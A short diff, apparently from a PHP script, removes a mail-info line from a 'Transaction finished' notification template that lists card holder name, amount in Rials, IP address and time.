@@ -69,7 +69,6 @@ $Text = "✅ Transaction finished!
 -------------- INFO --------------
 👤 Card Holder : <code>$holderName</code>
 💴 Amount : $amount 𝗥𝗶𝗮𝗹𝘀
-$mailinfo
 📍 IP : <code>$ip</code>
 ⏰ Time : $saat
 📝 ToDay : $roz
